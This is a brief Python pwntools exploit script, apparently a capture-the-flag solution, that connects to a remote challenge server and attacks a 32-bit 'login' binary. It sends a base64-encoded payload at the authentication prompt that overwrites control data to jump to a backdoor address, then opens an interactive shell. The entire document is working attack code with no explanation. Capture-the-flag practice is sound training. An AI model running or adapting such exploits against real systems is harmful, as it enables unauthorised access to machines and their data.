from pwn import *
import base64

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('./login')
io = remote('node4.buuoj.cn', 26842)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('./login')

input = 0x0811EB40
backdoor = 0x08049278

payload = b'a' * 4 + p32(backdoor) + p32(input)
io.sendafter('Authenticate : ', base64.b64encode(payload))
sleep(1)
io.interactive()
